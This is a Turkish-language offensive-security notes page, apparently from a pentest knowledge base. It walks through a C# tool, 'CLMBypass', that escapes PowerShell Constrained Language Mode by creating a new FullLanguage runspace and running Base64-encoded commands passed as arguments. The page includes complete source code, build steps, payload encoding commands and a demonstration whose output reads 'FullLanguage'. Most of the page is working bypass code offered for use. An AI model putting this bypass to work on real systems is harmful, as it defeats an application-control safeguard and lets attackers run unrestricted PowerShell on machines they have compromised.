# PowerShell Constrained Language Mode

## Enumeration

```pwsh
PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
```

```output title="Output"
ConstrainedLanguage
```

## Scenario

* Yeni bir [runspace](https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/creating-runspaces?view=powershell-7.5) oluşturulur.
* Oluşturulan runspace varsayılan olarak [FullLanguage](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5) kapsamında oluşturulur.
* Oluşturulan runspace üzerinde komut yürütülür.

## Case Study

* Console App (.NET Framework 4.7.2)
* Release, x64
* CLMBypass.sln

## Adding Reference

Proje için gerekli [System.Management.Automation](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation?view=powershellsdk-7.4.0) isim uzayını referans olarak eklemek için aşağıda verilen yolu takip et:

* Project
* Add Reference
* Browse

Aşağıda yolu verilen DLL dosyasını aç:

```text title="Path"
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

## Code

```cs title="Program.cs" linenums="1"
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CLMBypass
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;

            byte[] commandEncoded = Convert.FromBase64String(string.Join(" ", args));
            string command = System.Text.Encoding.UTF8.GetString(commandEncoded);

            ps.AddScript(command);

            Collection<PSObject> results = ps.Invoke();

            foreach (PSObject obj in results)
            {
                Console.WriteLine(obj.ToString());
            }

            runspace.Close();
        }
    }
}
```

## Understanding the Code

Yeni bir runspace FullLanguage kapsamında oluşturulur:

```cs title="Program.cs" linenums="12"
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
```

Yeni bir PowerShell nesnesi FullLanguage kullanacak şekilde oluşturulur:

```cs title="Program.cs" linenums="15"
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
```

Araca argüman olarak verilen Base64 komut, orijinal komuta çözülür:

!!! warning

    Duruma göre [Encoding.UTF8](https://learn.microsoft.com/en-us/dotnet/api/system.text.encoding.utf8?view=net-9.0) yerine [Encoding.Unicode](https://learn.microsoft.com/en-us/dotnet/api/system.text.encoding.unicode?view=net-9.0) tercih etmek gerekebilir.

=== "UTF-8"

    ```cs title="Program.cs" linenums="18"
    byte[] commandEncoded = Convert.FromBase64String(string.Join(" ", args));
    string command = System.Text.Encoding.UTF8.GetString(commandEncoded);
    ```

=== "UNICODE"

    ```cs title="Program.cs" linenums="18"
    byte[] commandEncoded = Convert.FromBase64String(string.Join(" ", args));
    string command = System.Text.Encoding.Unicode.GetString(commandEncoded);
    ```

## Creating the Base64 String

=== "UTF-8"

    ```sh
    my@attack:~$ printf 'Write-Output $ExecutionContext.SessionState.LanguageMode' | base64 -w 0
    ```

    ```output title="Output"
    V3JpdGUtT3V0cHV0ICRFeGVjdXRpb25Db250ZXh0LlNlc3Npb25TdGF0ZS5MYW5ndWFnZU1vZGU=
    ```

=== "UNICODE"

    ```sh
    my@attack:~$ printf 'Write-Output $ExecutionContext.SessionState.LanguageMode' | iconv -t UTF-16LE | base64 -w 0
    ```

    ```output title="Output"
    VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAEUAeABlAGMAdQB0AGkAbwBuAEMAbwBuAHQAZQB4AHQALgBTAGUAcwBzAGkAbwBuAFMAdABhAHQAZQAuAEwAYQBuAGcAdQBhAGcAZQBNAG8AZABlAA==
    ```

## Bypass

```pwsh
PS C:\Users\Administrator> C:\Tools\CLMBypass\CLMBypass\bin\x64\Release\CLMBypass.exe "V3JpdGUtT3V0cHV0ICRFeGVjdXRpb25Db250ZXh0LlNlc3Npb25TdGF0ZS5MYW5ndWFnZU1vZGU="
```

```output title="Output"
FullLanguage
```
